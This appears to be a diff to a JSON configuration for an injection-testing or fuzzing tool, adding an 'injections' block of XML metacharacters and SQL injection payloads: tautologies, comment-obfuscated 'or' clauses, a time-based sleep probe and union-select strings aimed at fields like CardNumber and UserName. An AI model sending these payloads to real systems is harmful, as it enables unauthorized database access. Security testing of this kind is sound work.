@@ -1,7 +1,6 @@
 {
   "output-language": "xml",
 
-  "expected-output-path": "/path/to/expectedMessageFile",
   "target-entries": [
     {
       "value": "wgen0001",
@@ -23,5 +22,37 @@
       "proxy-key": "CardNumber",
       "html-target": "UserName"
     }
-  ]
+  ],
+  "injections": {
+    "close": [
+      "</test>"
+    ],
+    "meta": [
+      "<",
+      "'",
+      "\"",
+      ">"
+    ],
+    "insert": [
+      "0 or~/**/1",
+      "1 or/**/\"a\"=\"a\" or",
+      "')/**/or true#",
+      "0/**/||'a'='a'/**/",
+      "'/**/;select sleep(5)--",
+      "0 union/**/(select 0)#",
+      "')/**/union/**/(select 0)#"
+    ],
+    "replicate": [
+      "0 or~/**/1",
+      "1 or/**/\"a\"=\"a\" or",
+      "')/**/or true#",
+      "0/**/||'a'='a'/**/"
+    ],
+    "replace": [
+      "0 or~/**/1",
+      "1 or/**/\"a\"=\"a\" or",
+      "')/**/or true#",
+      "0/**/||'a'='a'/**/"
+    ]
+  }
 }
